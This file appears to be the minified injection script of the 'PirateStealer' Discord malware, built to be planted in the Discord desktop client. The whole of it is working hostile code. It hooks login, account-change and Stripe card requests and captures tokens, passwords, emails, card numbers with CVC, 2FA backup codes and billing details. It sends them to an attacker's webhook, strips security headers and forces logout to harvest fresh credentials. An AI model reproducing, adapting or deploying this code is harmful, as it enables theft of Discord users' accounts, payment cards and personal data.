const{BrowserWindow:BrowserWindow,session:session}=require("electron"),fs=require("fs"),path=require("path"),querystring=require("querystring"),os=require("os"),webhook="%WEBHOOK_LINK%",Filters={1:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.stripe.com/v1/tokens"]},2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","https://*.discord.com/api/v*/users/@me/billing/subscriptions","https://discord.com/api/v*/users/@me/billing/subscriptions","wss://remote-auth-gateway.discord.gg/*"]}},config={minimum_members_per_server:"%MIN_MEMBERS%",logout:"instant","logout-notify":"%LOGOUTNOTI%","init-notify":"%INITNOTI%","embed-color":347704,"disable-qr-code":"%DISABLEQRCODE%",ping:[!1,"@everyone"]},badges={Discord_Employee:{Value:1,Emoji:"<:staff:874750808728666152>",Rare:!0},Partnered_Server_Owner:{Value:2,Emoji:"<:partner:874750808678354964>",Rare:!0},HypeSquad_Events:{Value:4,Emoji:"<:hypesquad_events:874750808594477056>",Rare:!0},Bug_Hunter_Level_1:{Value:8,Emoji:"<:bughunter_1:874750808426692658>",Rare:!0},Early_Supporter:{Value:512,Emoji:"<:early_supporter:874750808414113823>",Rare:!0},Bug_Hunter_Level_2:{Value:16384,Emoji:"<:bughunter_2:874750808430874664>",Rare:!0},Early_Verified_Bot_Developer:{Value:131072,Emoji:"<:developer:874750808472825986>",Rare:!0},House_Bravery:{Value:64,Emoji:"<:bravery:874750808388952075>",Rare:!1},House_Brilliance:{Value:128,Emoji:"<:brilliance:874750808338608199>",Rare:!1},House_Balance:{Value:256,Emoji:"<:balance:874750808267292683>",Rare:!1}};class PirateStealerEvent{constructor(e,t,n){this.event=e,this.data=n,this.token=t}handle(){switch(this.event){case"passwordChanged":passwordChanged(this.data.password,this.data.new_password,this.token);break;case"userLogin":userLogin(this.data.password,this.data.email,this.token);break;case"emailChanged":emailChanged(this.data.password,this.data.email,this.token);break;case"creditCardAdded":creditCardAdded(this.data.cardnumber,this.data.cvc,this.data.expiration,this.token)}}}async function firstTime(){var e=await getToken();if("true"==config["init-notify"]&&fs.existsSync(path.join(__dirname,"init")))if(fs.rmdirSync(path.join(__dirname,"init")),null==e||null==e||""==e){var t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{var n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Discord Initalized",color:config["embed-color"],fields:[{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1}],thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}if(!fs.existsSync(path.join(__dirname,"PirateStealerBTW")))return!0;if(fs.rmdirSync(path.join(__dirname,"PirateStealerBTW")),"false"!=config.logout&&"%LOGOUT%"!=config.logout){if(BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'),"true"==config["logout-notify"])if(null==e||null==e||""==e){t={content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"}}]};sendToWebhook(JSON.stringify(t))}else{const n=await getUserInfo(e);t={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User got logged out",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${n.username}#${n.discriminator}\``,inline:!0},{name:"ID",value:`\`${n.id}\``,inline:!0},{name:"Badges",value:`${getBadges(n.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${e}\`\`\``,inline:!1}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${n.id}/${n.avatar}`}}]};sendToWebhook(JSON.stringify(t))}}return!1}async function userLogin(e,t,n){var a=await getUserInfo(n),i=(await getIp(),await getServers(n),await getBilling(n)),r=(await getRelationships(n),{username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"User Login",color:config["embed-color"],fields:[{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!0},{name:"Billing",value:`${i}`,inline:!0}],thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]});if(n.startsWith("mfa")){var o=await get2faCodes(n,e),s={title:"__2FA Codes__",description:`[Get all of them](${o.url})`,color:config["embed-color"],fields:o.fields};r.embeds.push(s)}sendToWebhook(JSON.stringify(r))}async function emailChanged(e,t,n){var a=await getUserInfo(n),i=(await getIp(),await getRelationships(n),{username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Email Changed",color:config["embed-color"],fields:[{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"New Email",value:`\`${t}\``,inline:!0},{name:"Password",value:`\`${e}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1}],thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]});if(n.startsWith("mfa")){var r=await get2faCodes(n,e),o={title:"__2FA Codes__",description:`[Get all of them](${r.url})`,color:config["embed-color"],fields:r.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};i.embeds.push(o)}sendToWebhook(JSON.stringify(i))}async function passwordChanged(e,t,n){var a=await getUserInfo(n),i=(await getIp(),await getServers(n),await getBilling(n)),r=(await getRelationships(n),{username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Password Changed",color:config["embed-color"],fields:[{name:"Username",value:`\`${a.username}#${a.discriminator}\``,inline:!0},{name:"Email",value:`\`${a.email}\``,inline:!1},{name:"Old Password",value:`\`${e}\``,inline:!0},{name:"New Password",value:`\`${t}\``,inline:!0},{name:"Token",value:`\`\`\`${n}\`\`\``,inline:!1},{name:"Badges",value:`${getBadges(a.flags)}`,inline:!1},{name:"Nitro",value:`${getNitro(a.premium_type)}`,inline:!0},{name:"Billing",value:`${i}`,inline:!0}],thumbnail:{url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}`}}]});if(n.startsWith("mfa")){var o=await get2faCodes(n,t),s={title:"__2FA Codes__",description:`[Get all of them](${o.url})`,color:config["embed-color"],fields:o.fields,author:{name:"PirateStealer"},footer:{text:"PirateStealer"}};r.embeds.push(s)}sendToWebhook(JSON.stringify(r))}async function creditCardAdded(e,t,n,a){var i=await getUserInfo(a),r=(await getIp(),await getBilling(a)),o=await getRelationships(a),s={username:"PirateStealer",content:config.ping[0]?config.ping[1]:"",embeds:[{title:"Credit Card",color:config["embed-color"],fields:[{name:"Username",value:`\`${i.username}#${i.discriminator}\``,inline:!0},{name:"Email",value:`\`${i.email}\``,inline:!1},{name:"Token",value:`\`\`\`${a}\`\`\``,inline:!1},{name:"Badges",value:`${getBadges(i.flags)}`,inline:!1},{name:"Nitro",value:`${getNitro(i.premium_type)}`,inline:!0},{name:"Billing",value:`${r}`,inline:!0},{name:"CC Number",value:`\`${e}\``,inline:!1},{name:"Expiration",value:`\`${n}\``,inline:!0},{name:"CVC",value:`\`${t}\``,inline:!0}],author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}},{title:`Total Friends (${o.length})`,color:config["embed-color"],description:o.frien,author:{name:"PirateStealer"},footer:{text:"PirateStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${i.id}/${i.avatar}`}}]};sendToWebhook(JSON.stringify(s))}async function sendToWebhook(e){const t=new BrowserWindow({width:100,height:100,show:!1});t.loadURL("https://w3.org/"),t.webContents.executeJavaScript(`\n   new Promise(function (resolve, reject) {\n\n      var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);\n      xhr.onload = function () {\n          resolve(xhr.response)\n      }\n      xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${e}));\n\n  });\n      `,!0).then((()=>{t.close()}))}async function getServers(e){const t=BrowserWindow.getAllWindows()[0],n=await t.webContents.executeJavaScript(`function GetCoolGuilds(e){var r=new XMLHttpRequest;return r.open("GET","https://discord.com/api/v9/users/@me/guilds",!1),r.setRequestHeader("Authorization",e),r.send(null),r.responseText}function GetServerList(e){var r,t=JSON.parse(e);for(var n in cc=t.filter((e=>1==e.owner)).concat(t.filter((e=>8==(8&e.permissions)))),cc)cc[n].membercount=(r=cc[n].id,window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(e,r,t)=>e.exports=t},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{gg=e}]),function(e){const r="string"==typeof e?e:null;for(const t in gg.c)if(gg.c.hasOwnProperty(t)){const n=gg.c[t].exports;if(n&&n.__esModule&&n.default&&(r?n.default[r]:e(n.default)))return n.default;if(n&&(r?n[r]:e(n)))return n}return null}("getMemberCount").getMemberCounts()[r]);return cc}function _696969(){var e=GetCoolGuilds("%TOKEN%"),r=GetServerList(e).filter((e=>e.membercount>=${config.minimum_members_per_server})),t="";for(const e of r)t+="Server Name: "+e.name+" - Owner: "+e.owner+" - Members: "+e.membercount+"\\n";return""==t&&(t="\`No rare servers :(\`"),JSON.stringify({message:t,totalguilds:r.length})}_696969();`.replace("%TOKEN%",e),!0);return JSON.parse(n)}async function get2faCodes(e,t){let n=[],a="https://ctf.surf/raw/";const i=BrowserWindow.getAllWindows()[0];var r=await i.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);xmlHttp.setRequestHeader('Content-Type', 'application/json');xmlHttp.setRequestHeader("authorization", "${e}");xmlHttp.send(JSON.stringify({"password":"${t}","regenerate":false}));xmlHttp.responseText`,!0);const o=JSON.parse(r).backup_codes.filter((e=>null==e.consumed));for(let e in o)n.push({name:"Code",value:`\`${o[e].code.insert(4,"-")}\``,inline:!0}),a+=`${o[e].code.insert(4,"-")}\n`;return{fields:n,url:a}}async function getBilling(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${e}"); xmlHttp.send( null ); xmlHttp.responseText`,!0),a=JSON.parse(n),i="None";return a.forEach((e=>{if(2==e.type&&1!=e.invalid)i+="`??` <:paypal:896441236062347374>";else{if(1!=e.type||1==e.invalid)return"`?`";i+="`??` :credit_card:"}})),i=i??"`?`"}async function getUserInfo(e){const t=BrowserWindow.getAllWindows()[0];var n=await t.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );xmlHttp.setRequestHeader("Authorization", "${e}");xmlHttp.send( null );xmlHttp.responseText;`,!0);return JSON.parse(n)}async function getToken(){const e=BrowserWindow.getAllWindows()[0];return await e.webContents.executeJavaScript("for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;",!0)}function getBadges(e){var t="";for(const n in badges){let a=badges[n];(e&a.Value)==a.Value&&(t+=a.Emoji)}return""==t&&(t="None"),t}function getNitro(e){switch(e){case 1:return"<:classic:896119171019067423> `Nitro Classic`";case 2:return"<a:boost:824036778570416129> `Nitro Boost`";default:return"No Nitro"}}session.defaultSession.webRequest.onBeforeRequest(Filters[2],((e,t)=>{!e.url.startsWith("wss://")||"true"!=config["disable-qr-code"]&&"%DISABLEQRCODE%"!=config["disable-qr-code"]?(firstTime(),t({})):t({cancel:!0})})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(Filters[1],(async(e,t)=>{if(200!=e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),i=await getToken();switch(!0){case e.url.endsWith("login"):return void new PirateStealerEvent("userLogin",i,{password:a.password,email:a.login}).handle();case e.url.endsWith("users/@me")&&"PATCH"==e.method:if(!a.password)return;if(a.email)new PirateStealerEvent("emailChanged",i,{password:a.password,email:a.email}).handle();if(a.new_password)new PirateStealerEvent("passwordChanged",i,{password:a.password,new_password:a.new_password}).handle();return;case e.url.endsWith("tokens")&&"POST"==e.method:const t=querystring.parse(decodeURIComponent(n));return void new PirateStealerEvent("creditCardAdded",i,{cardnumber:t["card[number]"],cvc:t["card[cvc]"],expiration:`${t["card[exp_month]"]}/${t["card[exp_year]"]}`}).handle()}})),module.exports=require("./core.asar");
